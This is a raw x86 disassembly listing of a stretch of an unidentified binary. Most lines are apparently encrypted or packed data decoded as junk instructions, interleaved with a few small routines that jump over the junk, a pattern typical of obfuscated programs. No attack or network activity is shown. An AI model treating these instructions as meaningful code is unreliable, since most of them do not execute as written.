  40515e:	mov    DWORD PTR [ecx+ecx*8+0x6633c110],0x762c1940
  405169:	imul   ebx,DWORD PTR [edx],0x8fae1170
  40516f:	ficomp DWORD PTR [edx]
  405171:	or     al,0xd0
  405173:	mov    eax,0xf5859a22
  405178:	imul   DWORD PTR [eax]
  40517a:	sbb    eax,0x93adaf2
  40517f:	mov    cl,0x2a
  405181:	rcr    dl,cl
  405183:	xchg   esi,eax
  405184:	(bad)  
  405185:	nop
  405186:	xchg   esp,eax
  405187:	jmp    DWORD PTR [edi-0x1b]
  40518a:	or     BYTE PTR [edi],al
  40518c:	mov    edi,0xf6ee75d3
  405191:	dec    edi
  405192:	dec    ebp
  405193:	sahf   
  405194:	sbb    BYTE PTR [edx+0x76a02fea],bl
  40519a:	push   0xffffff86
  40519c:	and    cl,BYTE PTR [ecx+0x34]
  40519f:	hlt    
  4051a0:	pop    edx
  4051a1:	dec    ecx
  4051a2:	mov    ah,0x9a
  4051a4:	or     esi,edx
  4051a6:	cmp    edi,DWORD PTR [esi]
  4051a8:	sbb    DWORD PTR [edx-0x31],eax
  4051ab:	shr    edx,0x25
  4051ae:	xchg   esi,eax
  4051af:	sahf   
  4051b0:	pop    es
  4051b1:	jb     0x4051bc
  4051b3:	mov    ebp,0x4f309cc8
  4051b8:	scas   al,BYTE PTR es:[edi]
  4051b9:	stos   BYTE PTR es:[edi],al
  4051ba:	jbe    0x40522d
  4051bc:	lea    ebx,[edx+0x685cb48]
  4051c2:	sbb    eax,0x166f7c27
  4051c7:	bsr    edi,edi
  4051ca:	stc    
  4051cb:	fdiv   DWORD PTR [eax+ebx*1+0x5f4affab]
  4051d2:	shr    ebx,0x20
  4051d5:	add    eax,esp
  4051d7:	add    eax,0xf188e06b
  4051dc:	jae    0x4051fc
  4051de:	adc    eax,0xa2ddf177
  4051e3:	stos   DWORD PTR es:[edi],eax
  4051e4:	sbb    al,0xb9
  4051e6:	pushf  
  4051e7:	add    eax,0x8e5edd49
  4051ec:	mov    esp,DWORD PTR [edx+0x10c33a68]
  4051f2:	test   DWORD PTR [ebx],ecx
  4051f4:	sar    BYTE PTR [edi-0x206c11c1],cl
  4051fa:	ins    DWORD PTR es:[edi],dx
  4051fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051fc:	jo     0x405248
  4051fe:	inc    edx
  4051ff:	inc    ecx
  405200:	mov    edx,0x3acb1f44
  405205:	mov    dh,0x1b
  405207:	repz sub dh,BYTE PTR [eax]
  40520a:	mov    dh,0xcb
  40520c:	cmp    DWORD PTR [ebx+edx*8-0x6ce21ae5],esp
  405213:	das    
  405214:	imul   eax,esp,0x865abfee
  40521a:	enter  0xe22c,0xc
  40521e:	pop    esp
  40521f:	out    dx,eax
  405220:	jns    0x40522f
  405222:	retf   
  405223:	cmp    al,0xd1
  405225:	mov    eax,0x44304147
  40522a:	sbb    edx,ecx
  40522c:	addr16 push esi
  40522e:	lock leave 
  405230:	xchg   esp,eax
  405231:	mov    ecx,0x93cc7c89
  405236:	call   0x414a6188
  40523b:	mov    DWORD PTR [ebp+0xc],eax
  40523e:	mov    eax,DWORD PTR [ebp-0x4]
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0xe3253739
  40528d:	inc    eax
  40528e:	pop    ebx
  40528f:	sub    bh,BYTE PTR [esi+0x7e]
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x405316
  405297:	ins    DWORD PTR es:[edi],dx
  405298:	mov    dl,0x75
  40529a:	sbb    DWORD PTR [edx+0x3da08281],ecx
  4052a0:	out    0x6f,al
  4052a2:	out    dx,eax
  4052a3:	push   edi
  4052a4:	psadbw mm3,QWORD PTR [esi+0x26]
  4052a8:	and    BYTE PTR [edi+0x43],ch
  4052ab:	clc    
  4052ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ad:	scas   eax,DWORD PTR es:[edi]
  4052ae:	mov    ds:0xb417eba7,eax
  4052b3:	ja     0x40524c
  4052b5:	popf   
  4052b6:	dec    esi
  4052b7:	push   edx
  4052b8:	loopne 0x405309
  4052ba:	dec    eax
  4052bb:	pop    esp
  4052bc:	push   eax
  4052bd:	xor    BYTE PTR [eax],0x17
  4052c0:	dec    esi
  4052c1:	jl     0x4052e9
  4052c3:	fadd   DWORD PTR [ebp+0x6d01de89]
  4052c9:	adc    al,0xd1
  4052cb:	push   ebx
  4052cc:	fld    DWORD PTR [esi-0x76]
  4052cf:	jg     0x405276
  4052d1:	cmp    edx,DWORD PTR [edi]
  4052d3:	mov    WORD PTR [esi+0x7c056dd],ss
  4052d9:	push   edx
  4052da:	ret    0xdbdb
  4052dd:	js     0x405298
  4052df:	js     0x405324
  4052e1:	icebp  
  4052e2:	mov    bl,0xa7
  4052e4:	fadd   st,st(2)
  4052e6:	mov    ecx,0x5329a909
  4052eb:	cli    
  4052ec:	sub    eax,0x9a5e6ffc
  4052f1:	repnz out dx,al
  4052f3:	mov    ds:0xf7288716,al
  4052f8:	pop    esp
  4052f9:	ins    DWORD PTR es:[edi],dx
  4052fa:	test   eax,0x5ba12ec6
  4052ff:	in     eax,dx
  405300:	mov    cl,0x80
  405302:	cmp    dh,ch
  405304:	call   0xf2b3:0x3c1a49ed
  40530b:	pop    ebp
  40530c:	adc    eax,0xae37f39
  405311:	(bad)  
  405312:	retf   0xeccd
  405315:	or     DWORD PTR [eax],esi
  405317:	add    edi,ebp
  405319:	adc    edi,edi
  40531b:	and    dh,dl
  40531d:	mov    eax,0xc1aa195b
  405322:	(bad)  
  405323:	call   0xa9b8589c
  405328:	fnsave [edi]
  40532a:	mov    eax,0xb36adaae
  40532f:	into   
  405330:	je     0x40534c
  405332:	jb     0x40537f
  405334:	xchg   ecx,eax
  405335:	fmul   QWORD PTR [eax]
  405337:	lahf   
  405338:	fs ss aad 0xe4
  40533c:	pop    ecx
  40533d:	or     esi,DWORD PTR [ecx+0x4d]
  405340:	mov    al,ds:0xf4abf235
  405345:	popf   
  405346:	xchg   esi,eax
  405347:	fwait
  405348:	pop    esi
  405349:	sbb    ah,dl
  40534b:	mov    eax,ds:0xe461e1d0
  405350:	out    0xbc,eax
  405352:	jae    0x405331
  405354:	xchg   ebp,eax
  405355:	pop    ebx
  405356:	xchg   DWORD PTR [eax],esi
  405358:	mov    bh,0xe
  40535a:	scas   eax,DWORD PTR es:[edi]
  40535b:	sbb    DWORD PTR [ebp+ebx*1+0x3f],edi
  40535f:	js     0x40531b
  405361:	xchg   BYTE PTR [edi-0x37e0b0a5],ch
  405367:	pop    edi
  405368:	inc    ebx
  405369:	popa   
  40536a:	dec    eax
  40536b:	push   cs
  40536c:	(bad)  
  40536d:	in     eax,dx
  40536e:	es xchg ebp,eax
  405370:	sbb    BYTE PTR [edi],ch
  405372:	mov    edi,0x67d23a7e
  405377:	js     0x405313
  405379:	fnstcw WORD PTR [ebx+0x29]
  40537c:	pop    ss
  40537d:	pop    edx
  40537e:	jg     0x405307
  405380:	pop    eax
  405381:	jns    0x405369
  405383:	and    DWORD PTR [eax-0x38],0x2c
  405387:	or     bh,ch
  405389:	pop    edx
  40538a:	stos   DWORD PTR es:[edi],eax
  40538b:	push   0x67
  40538d:	jne    0x4053b5
  40538f:	jge    0x4053ea
  405391:	imul   edx,DWORD PTR [esi+0x250f03be],0x83454822
  40539b:	and    eax,0x90a24309
  4053a0:	sbb    esi,ebp
  4053a2:	stos   BYTE PTR es:[edi],al
  4053a3:	push   es
  4053a4:	mov    ch,0x51
  4053a6:	repnz add al,0xd6
  4053a9:	or     BYTE PTR [ecx-0x304ed299],ch
  4053af:	jp     0x4053a4
  4053b1:	add    ah,cl
  4053b3:	dec    ecx
  4053b4:	xor    dl,BYTE PTR [eax]
  4053b6:	(bad)  [edx+eiz*4+0x21]
  4053ba:	in     al,dx
  4053bb:	(bad)  
  4053bc:	int3   
  4053bd:	rcr    DWORD PTR [edi-0x49],1
  4053c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053c1:	ret    
  4053c2:	xor    eax,edi
  4053c4:	adc    BYTE PTR [esi-0x41],bl
  4053c7:	das    
  4053c8:	cmc    
  4053c9:	mov    WORD PTR [ecx],ds
  4053cb:	(bad)  es:[ecx+ebp*4]
  4053cf:	jmp    0x5ef9:0x15ed586e
  4053d6:	sahf   
  4053d7:	stc    
  4053d8:	sti    
  4053d9:	into   
  4053da:	aam    0x5b
  4053dc:	cli    
  4053dd:	jo     0x4053e2
  4053df:	jmp    0xab44:0x1deeaf71
  4053e6:	lahf   
  4053e7:	in     eax,dx
  4053e8:	push   0x17
  4053ea:	or     al,0xc9
  4053ec:	pop    es
  4053ed:	sti    
  4053ee:	dec    ebx
  4053ef:	mov    cl,0x8b
  4053f1:	test   ecx,ebp
  4053f3:	retf   
  4053f4:	add    DWORD PTR [edx+0x4],esp
  4053f7:	ret    
  4053f8:	aam    0xd0
  4053fa:	ds mov ah,0xe3
  4053fd:	dec    edi
  4053fe:	xadd   eax,eax
  405401:	add    eax,0xa8ebc9ad
  405406:	push   esi
  405407:	push   eax
  405408:	pop    ebx
  405409:	aad    0x20
  40540b:	scas   al,BYTE PTR es:[edi]
  40540c:	call   0x5cd43bd3
  405411:	add    DWORD PTR [edi+0x669caa64],edx
  405417:	adc    BYTE PTR [esi-0x4d],bl
  40541a:	mov    ch,0xcf
  40541c:	fs xor eax,0xb43c03f7
  405422:	add    dh,BYTE PTR [edi-0x36]
  405425:	loopne 0x405405
  405427:	jne    0x4053ac
  405429:	or     cl,ah
  40542b:	xlat   BYTE PTR ds:[ebx]
  40542c:	retf   
  40542d:	dec    edi
  40542e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40542f:	and    ah,BYTE PTR [esi-0x4d]
  405432:	std    
  405433:	(bad)  
  405434:	(bad)  [ebx+0x64]
  405437:	xchg   DWORD PTR cs:[ebx+0x7892379],eax
  40543e:	sub    ecx,DWORD PTR [esi+0x179c2f07]
  405444:	fdivr  QWORD PTR [eax+ecx*4-0x53]
  405448:	stc    
  405449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40544a:	inc    ebx
  40544b:	arpl   WORD PTR [esi-0x75],sp
  40544e:	jg     0x405491
  405450:	jg     0x405419
  405452:	pop    esi
  405453:	adc    cl,BYTE PTR ds:0x19839813
  405459:	cmp    al,0xaf
  40545b:	cmp    edx,DWORD PTR [ebp+ecx*2-0x46490948]
  405462:	jo     0x4054bc
  405464:	sub    BYTE PTR [eax+0x50514448],0x6
  40546b:	mov    esi,0x5d08b517
  405470:	out    0xa2,al
  405472:	sbb    eax,0x5ae6f5bc
  405477:	mov    eax,0x721b32d
  40547c:	add    DWORD PTR [edi],ebp
  40547e:	stc    
  40547f:	mov    ebp,DWORD PTR [ecx-0x2d7b391d]
  405485:	das    
  405486:	jp     0x405459
  405488:	js     0x4054cf
  40548a:	xchg   DWORD PTR [eax+0x1e6f3b3f],esi
  405490:	inc    esi
  405491:	into   
  405492:	cli    
  405493:	push   ecx
  405494:	bndstx [ebx],(bad)
  405497:	push   ebp
  405498:	popa   
  405499:	pop    ecx
  40549a:	xchg   esi,eax
  40549b:	push   eax
  40549c:	push   es
  40549d:	hlt    
  40549e:	stos   BYTE PTR es:[edi],al
  40549f:	sbb    DWORD PTR [esi+0x61],edi
  4054a2:	js     0x40551d
  4054a4:	jmp    edi
  4054a6:	adc    ebx,DWORD PTR [ebx-0x3f]
  4054a9:	mov    gs,WORD PTR [esp+eax*8+0x69182395]
  4054b0:	and    edx,ecx
  4054b2:	arpl   sp,bp
  4054b4:	mov    ds:0xeffb8690,al
  4054b9:	mov    al,ds:0xdca73edd
  4054be:	pop    ds
  4054bf:	xor    eax,0xadd13de
  4054c4:	(bad)  
  4054c5:	cmc    
  4054c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054c7:	xor    bl,BYTE PTR [edx-0x3a]
  4054ca:	pop    ecx
  4054cb:	inc    ecx
  4054cc:	pop    ebp
  4054cd:	(bad)  
  4054ce:	stc    
  4054cf:	retf   
  4054d0:	and    DWORD PTR [esi+esi*1+0x72],edx
  4054d4:	mov    DWORD PTR [ebx],esi
  4054d6:	adc    BYTE PTR [ebp-0x54],ah
  4054d9:	or     BYTE PTR [ebp-0x6fc01f1c],dh
  4054df:	into   
  4054e0:	(bad)  
  4054e1:	xrelease mov BYTE PTR [edi],0x99
  4054e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054e6:	sahf   
  4054e7:	sub    edi,edx
  4054e9:	lahf   
  4054ea:	adc    ecx,DWORD PTR [esi-0xa]
  4054ed:	(bad)  
  4054ee:	gs je  0x405533
  4054f1:	push   esi
  4054f2:	(bad)  
  4054f3:	std    
  4054f4:	lods   eax,DWORD PTR ds:[esi]
  4054f5:	xchg   esi,eax
  4054f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054f7:	or     bh,cl
  4054f9:	in     eax,0x79
  4054fb:	enter  0x3b45,0x87
  4054ff:	adc    eax,ecx
  405501:	add    esi,edx
  405503:	push   DWORD PTR [esi-0x30]
  405506:	jecxz  0x405554
  405508:	jmp    0x40555e
  40550a:	adc    BYTE PTR [ecx-0x5297166],ch
  405510:	stos   BYTE PTR es:[edi],al
  405511:	and    BYTE PTR [edx-0x4],ch
  405514:	jno    0x405549
  405516:	xor    dl,ch
  405518:	mov    esi,0x9bd09253
  40551d:	push   ebp
  40551e:	cld    
  40551f:	mov    gs,WORD PTR [esp-0x11a0a962]
  405526:	enter  0xed54,0xc2
  40552a:	arpl   bx,di
  40552c:	out    0xbc,eax
  40552e:	add    cl,cl
  405530:	xchg   cl,ah
  405532:	aaa    
  405533:	pop    edx
  405534:	jns    0x405588
  405536:	xor    al,ch
  405538:	cmp    al,0xa6
  40553a:	or     esi,ebx
  40553c:	test   al,0xd3
  40553e:	add    esi,DWORD PTR [ebx-0x6c4ff3bc]
  405544:	(bad)  
  405545:	loopne 0x40555d
  405547:	mov    esi,0xf95ac8a5
  40554c:	inc    esi
  40554d:	xor    DWORD PTR [edx],ebx
  40554f:	xchg   esi,eax
  405550:	adc    eax,0xccffca2
  405555:	jne    0x405557
  405557:	xchg   eax,esp
  405559:	xor    BYTE PTR [eax-0x13],cl
  40555c:	stos   DWORD PTR es:[edi],eax
  40555d:	pushf  
  40555e:	mov    dh,0x4e
  405560:	mul    BYTE PTR [ecx]
  405562:	pusha  
  405563:	pop    ds
  405564:	out    0xbf,al
  405566:	inc    ebx
  405567:	(bad)  
  405568:	xlat   BYTE PTR ds:[ebx]
  405569:	iret   
  40556a:	pop    esi
  40556b:	out    0x72,al
  40556d:	scas   eax,DWORD PTR es:[edi]
  40556e:	mov    ah,0x93
  405570:	sub    eax,esi
  405572:	lods   al,BYTE PTR ds:[esi]
  405573:	xchg   BYTE PTR [ebx+0x68078885],dl
  405579:	or     DWORD PTR [ebp-0x4787897d],0x9e2583af
  405583:	loope  0x405507
  405585:	lds    ebx,FWORD PTR [ebp+0x3c]
  405588:	fcmovb st,st(0)
  40558a:	sbb    al,0x12
  40558c:	cmp    eax,0x467e5a0d
  405591:	xchg   DWORD PTR [edi+ebx*4+0x4183b43d],eax
  405598:	jno    0x405606
  40559a:	push   ds
  40559b:	out    dx,al
  40559c:	fsub   st(1),st
  40559e:	cmp    BYTE PTR [ecx],al
  4055a0:	mov    ah,0xd
  4055a2:	jl     0x405583
  4055a4:	add    DWORD PTR [eax-0x6ae58a8b],ecx
  4055aa:	shl    BYTE PTR [eax+0x14],1
  4055ad:	cli    
  4055ae:	xlat   BYTE PTR ds:[ebx]
  4055af:	call   0x3be068c8
  4055b4:	rcr    BYTE PTR [eax+0x42],1
  4055b7:	js     0x40554f
  4055b9:	add    DWORD PTR [ebp-0x6],edi
  4055bc:	sbb    DWORD PTR [ecx],ebx
  4055be:	scas   al,BYTE PTR es:[edi]
  4055bf:	and    BYTE PTR ds:0xb3321733,ah
  4055c5:	bound  ebx,QWORD PTR [ebx-0xdc0d3ec]
  4055cb:	mov    al,ds:0xb3a33f39
  4055d0:	xchg   ebx,eax
  4055d1:	adc    ah,BYTE PTR [ebx+0x5e976b3f]
  4055d7:	jnp    0x4055d2
  4055d9:	ins    DWORD PTR es:[edi],dx
  4055da:	add    BYTE PTR [eax],dh
  4055dc:	push   ecx
  4055dd:	mov    eax,0x5a3fc9f
  4055e2:	mov    DWORD PTR [ebp-0x4],eax
  4055e5:	mov    DWORD PTR ds:0x4345f3,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	cs pushf 
  405604:	outs   dx,DWORD PTR ds:[esi]
  405605:	test   BYTE PTR [eax+0x7e7e3621],0xc4
  40560c:	jns    0x40568c
  40560e:	jle    0x40561e
  405610:	stc    
  405611:	fstp   DWORD PTR [ebx-0x7c]
  405614:	mov    ebp,0x9ea38cb5
  405619:	jno    0x40567a
  40561b:	pop    edi
  40561c:	xchg   ah,ch
  40561e:	xchg   esi,eax
  40561f:	push   ss
  405620:	inc    esi
  405621:	lea    edx,[eax+0x1e]
  405624:	pop    eax
  405625:	sub    DWORD PTR [ebp+0x3390bd99],esp
  40562b:	or     dh,ch
  40562d:	call   0x48733d5a
  405632:	retf   
  405633:	dec    edi
  405634:	icebp  
  405635:	inc    ebx
  405636:	loop   0x4055f0
  405638:	push   ds
  405639:	push   ss
  40563a:	cmp    eax,0xf24a86b1
  40563f:	dec    ecx
  405640:	push   cs
  405641:	mov    edx,0x26884585
  405646:	mov    al,ds:0x8dd71e9
  40564b:	cmp    bh,BYTE PTR [edi-0x5acad611]
  405651:	adc    WORD PTR [edx*1-0x3b505977],bx
  405659:	sub    eax,0x64b22e9
  40565e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40565f:	mov    eax,ds:0xda7cef08
  405664:	lea    si,[edx+ecx*4-0x22572857]
  40566c:	das    
  40566d:	sbb    dl,al
  40566f:	es loope 0x4056c4
  405672:	or     BYTE PTR [edi-0x67],ah
  405675:	test   al,0x8f
  405677:	and    bh,BYTE PTR [esi]
  405679:	ret    0xd4d4
  40567c:	call   0xcd6a9f96
  405681:	mov    bl,0xa0
  405683:	retf   0x84f3
  405686:	lahf   
  405687:	lahf   
  405688:	cmp    edi,DWORD PTR [ebx+0x4c]
  40568b:	cmp    edx,DWORD PTR [edi+0x72]
  40568e:	mov    eax,ds:0x46190b7d
  405693:	out    0xf8,al
  405695:	popf   
  405696:	adc    al,0xec
  405698:	cli    
  405699:	xor    eax,0xf15e8be3
  40569e:	xor    eax,0x73485fc3
  4056a3:	sar    esp,cl
  4056a5:	dec    BYTE PTR [ebp-0x6d289f59]
  4056ab:	mov    al,0xca
  4056ad:	dec    edx
  4056ae:	mov    ecx,0x4972f13e
  4056b3:	mov    WORD PTR [ebx],ds
  4056b5:	dec    edx
  4056b6:	data16 sti 
  4056b8:	pop    ebx
  4056b9:	repz and BYTE PTR [eax],ah
  4056bc:	hlt    
  4056bd:	mov    al,BYTE PTR [esp+ebx*2+0x67]
  4056c1:	dec    ebp
  4056c2:	stc    
  4056c3:	test   eax,0x620d9a33
  4056c8:	fs in  eax,dx
  4056ca:	leave  
  4056cb:	je     0x4056b0
  4056cd:	scas   al,BYTE PTR es:[edi]
  4056ce:	dec    esp
  4056cf:	data16 cs arpl sp,si
  4056d3:	push   eax
  4056d4:	pop    esi
  4056d5:	dec    edx
  4056d6:	sub    DWORD PTR [eax-0x6803f2fa],edx
  4056dc:	xchg   DWORD PTR [edi],ebx
  4056de:	add    al,0xf5
  4056e0:	icebp  
  4056e1:	sbb    eax,0xf863ec9e
  4056e6:	(bad)  
  4056e7:	push   0x62
  4056e9:	jl     0x4056a1
  4056eb:	mov    dh,0x68
  4056ed:	lods   eax,DWORD PTR ds:[esi]
  4056ee:	mov    ebp,0x47f5cb18
  4056f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056f4:	das    
  4056f5:	jne    0x405757
  4056f7:	adc    ah,bh
  4056f9:	rcl    BYTE PTR [eax-0x55a01cb],0x12
  405700:	(bad)  
  405701:	adc    bh,BYTE PTR [esi-0x7]
  405704:	(bad)  
  405705:	xor    eax,0x4dad2987
  40570a:	loope  0x405721
  40570c:	push   ecx
  40570d:	cmc    
  40570e:	call   0xed0701ee
  405713:	lods   eax,DWORD PTR ds:[esi]
  405714:	mov    eax,0x7bb5ae6
  405719:	nop
  40571a:	push   ds
  40571b:	and    DWORD PTR [edi-0x40],ebp
  40571e:	mov    DWORD PTR [edi],esi
  405720:	xchg   BYTE PTR [esi+0x5200540c],bl
  405726:	push   ecx
  405727:	stos   BYTE PTR es:[edi],al
  405728:	test   al,0x94
  40572a:	add    DWORD PTR [ecx],esp
  40572c:	pop    esp
  40572d:	inc    esi
  40572e:	aad    0x25
  405730:	test   ebx,edx
  405732:	add    DWORD PTR [ecx+ecx*1-0x241408f0],ebp
  405739:	inc    esp
  40573a:	cld    
  40573b:	jecxz  0x40570d
  40573d:	fsub   st(3),st
  40573f:	mov    ?,WORD PTR [edx*2-0x4681c09f]
  405746:	dec    esp
  405748:	sub    eax,0x169f1292
  40574d:	push   esi
  40574e:	push   ss
  40574f:	inc    ebp
  405750:	inc    edi
  405751:	lahf   
  405752:	adc    BYTE PTR [esi+esi*4-0x7e56455f],0x13
  40575a:	inc    edi
  40575b:	fadd   QWORD PTR [eax+ebp*1-0xd]
  40575f:	loopne 0x4057d1
  405761:	inc    ebp
  405762:	adc    BYTE PTR [eax+0x58f69241],dl
  405768:	addr16 xchg ebp,eax
  40576a:	or     al,0x3
  40576c:	xchg   edx,eax
  40576d:	(bad)  
  40576e:	cld    
  40576f:	inc    ecx
  405770:	das    
  405771:	outs   dx,BYTE PTR ds:[esi]
  405772:	mov    bh,0x1d
  405774:	mov    ah,0xa3
  405776:	aam    0xf6
  405778:	pop    ebx
  405779:	xlat   BYTE PTR ds:[ebx]
  40577a:	adc    al,0x8f
  40577c:	jns    0x405754
  40577e:	je     0x405708
  405780:	cmp    DWORD PTR [edi+0x53],esi
  405783:	mov    bl,BYTE PTR [ecx+0x27]
  405786:	jne    0x4057a0
  405788:	mov    esp,0x8ab750a4
  40578d:	push   ebx
  40578e:	mov    ecx,esp
  405790:	pop    ebx
  405791:	mov    al,BYTE PTR [eax-0x2e08ccb3]
  405797:	fs ins BYTE PTR es:[edi],dx
  405799:	scas   eax,DWORD PTR es:[edi]
  40579a:	gs mov ebx,0xe00633dc
  4057a0:	cmp    ebx,edi
  4057a2:	rcr    ch,1
  4057a4:	push   0xffffffba
  4057a6:	js     0x405816
  4057a8:	add    eax,0x930ba334
  4057ad:	leave  
  4057ae:	daa    
  4057af:	test   eax,0x5d0d821e
  4057b4:	jmp    0x40582f
  4057b6:	mov    al,0xf0
  4057b8:	xor    esi,DWORD PTR es:[ecx+0xd]
  4057bc:	sub    BYTE PTR [esi-0x41c29609],al
  4057c2:	out    dx,eax
  4057c3:	fild   DWORD PTR [edx+0xf]
  4057c6:	mov    ds:0xe7111351,al
  4057cb:	iret   
  4057cc:	scas   eax,DWORD PTR es:[edi]
  4057cd:	mov    ah,0xda
  4057cf:	into   
  4057d0:	jnp    0x4057c4
  4057d2:	test   DWORD PTR [edx-0x15],edx
  4057d5:	jmp    0xe1794e8e
  4057da:	pusha  
  4057db:	pop    edx
  4057dc:	mov    bh,0x40
  4057de:	inc    ebp
  4057df:	add    ecx,DWORD PTR [eax]
  4057e1:	aam    0x1d
  4057e3:	mov    al,ds:0x8ac05581
  4057e8:	out    dx,eax
  4057e9:	pop    ds
  4057ea:	cwde   
  4057eb:	mov    fs,ecx
  4057ed:	repz pop edi
  4057ef:	and    al,0x5a
  4057f1:	xchg   BYTE PTR [edi+0x1e89ad8c],ah
  4057f7:	lods   eax,DWORD PTR ds:[esi]
  4057f8:	inc    ecx
  4057f9:	jp     0x405851
  4057fb:	mov    WORD PTR [edi+eax*4-0x12],gs
  4057ff:	dec    edx
  405800:	ret    
  405801:	mov    ch,0x99
  405803:	fcomp  st(7)
  405805:	xor    eax,0x7192e7b9
  40580a:	cmp    al,0x43
  40580c:	sub    eax,0x20caeb16
  405811:	xor    dh,BYTE PTR [edx-0x18bbcef8]
  405817:	add    BYTE PTR [ebx-0x1],dl
  40581a:	pop    esi
  40581b:	outs   dx,DWORD PTR ds:[esi]
  40581c:	push   0x5f665a37
  405821:	push   edx
  405822:	lods   al,BYTE PTR ds:[esi]
  405823:	aas    
  405824:	test   BYTE PTR [ecx-0x7de660f],bl
  40582a:	das    
  40582b:	test   edx,edx
  40582d:	loopne 0x4057af
  40582f:	push   edi
  405830:	sub    BYTE PTR [edx-0x67],0x2b
  405834:	fucomp st(7)
  405836:	lods   eax,DWORD PTR ds:[esi]
  405837:	sbb    dh,BYTE PTR [ecx-0x70]
  40583a:	ins    BYTE PTR es:[edi],dx
  40583b:	add    edi,DWORD PTR [eax-0x44]
  40583e:	jmp    0xd2dea9f3
  405843:	cdq    
  405844:	push   0x291521f4
  405849:	in     eax,dx
  40584a:	sub    eax,0x948d2d3b
  40584f:	mov    edi,eax
  405851:	icebp  
  405852:	gs int 0x3c
  405855:	dec    ecx
  405856:	cld    
  405857:	data16 sbb BYTE PTR [edi-0x1f202f8e],ch
  40585e:	fistp  QWORD PTR [esi]
  405860:	pusha  
  405861:	div    edi
  405863:	jb     0x405826
  405865:	fmul   st,st(5)
  405867:	jne    0x405861
  405869:	scas   al,BYTE PTR es:[edi]
  40586a:	cmp    BYTE PTR ds:[esi-0x642c20b1],0xc
  405872:	pop    es
  405873:	in     al,0xd3
  405875:	imul   edx,eax,0x4c
  405878:	je     0x405892
  40587a:	in     eax,0xce
  40587c:	and    al,0xdf
  40587e:	or     bl,BYTE PTR [eax-0x7d6e4436]
  405884:	dec    esi
  405885:	les    esp,FWORD PTR [ecx+0x63]
  405888:	jl     0x405820
  40588a:	adc    ah,ah
  40588c:	and    eax,0x532e9869
  405891:	retf   
  405892:	js     0x405831
  405894:	(bad)  
  405895:	cmp    edx,DWORD PTR [ecx]
  405897:	push   edi
  405898:	sbb    BYTE PTR [edi-0x13240975],al
  40589e:	fnstenv [eax+0x2]
  4058a1:	push   ss
  4058a2:	aas    
  4058a3:	inc    eax
  4058a4:	add    edx,ebp
  4058a6:	mov    DWORD PTR [eax+0x34797285],esi
  4058ac:	test   dl,0xb7
  4058af:	cwde   
  4058b0:	cmp    ecx,DWORD PTR [edx+0x3d4ada92]
  4058b6:	mov    DWORD PTR [ecx+0x66362bb9],esi
  4058bc:	fistp  QWORD PTR [ebp+0x30]
  4058bf:	idiv   BYTE PTR [ecx+0xe2c2f0b]
  4058c5:	loope  0x40589f
  4058c7:	sbb    eax,DWORD PTR [eax+0x77de661]
  4058cd:	pop    edx
  4058ce:	je     0x4058eb
  4058d0:	xor    BYTE PTR [ebp+0x1f6effc8],dh
  4058d6:	stos   DWORD PTR es:[edi],eax
  4058d7:	lods   eax,DWORD PTR ds:[esi]
  4058d8:	jmp    0xda05b9a
  4058dd:	adc    BYTE PTR [eax+0x563d0d58],bh
  4058e3:	ja     0x4058ea
  4058e5:	cwde   
  4058e6:	test   eax,0x1a285349
  4058eb:	push   ss
  4058ec:	imul   eax,DWORD PTR [ebx*4-0x5d1f47c1],0xb
  4058f4:	repz pop ss
  4058f6:	aas    
  4058f7:	adc    BYTE PTR [ebx],dh
  4058f9:	adc    eax,0xa7b7eb3d
  4058fe:	je     0x4058b7
  405900:	jne    0x405891
  405902:	lods   eax,DWORD PTR ds:[esi]
  405903:	dec    ebx
  405904:	jle    0x40590b
  405906:	xlat   BYTE PTR ds:[ebx]
  405907:	mov    dl,0x24
  405909:	xchg   BYTE PTR [ecx+0x2476422a],ch
  40590f:	hlt    
  405910:	jmp    0x405911
  405912:	dec    edi
  405913:	out    0x9c,al
  405915:	imul   esi,DWORD PTR [ebp+ecx*4+0x26],0xffffff8f
  40591a:	dec    ebx
  40591b:	bound  esp,QWORD PTR [edi]
  40591d:	jb     0x4058d5
  40591f:	lock xor bl,dh
  405922:	mov    eax,0xdb15f7c9
  405927:	dec    eax
  405928:	sub    DWORD PTR [ecx+0x1315144c],esp
  40592e:	mov    esi,0x20ebc0bf
  405933:	xor    DWORD PTR [ecx-0x44],ebp
  405936:	add    DWORD PTR [edi+0x72],edx
  405939:	xchg   ebx,eax
  40593a:	jmp    0xcf86f062
  40593f:	jecxz  0x405976
  405941:	pop    ds
  405942:	cli    
  405943:	fcmovbe st,st(0)
  405945:	pop    ss
  405946:	std    
  405947:	push   es
  405948:	pop    ecx
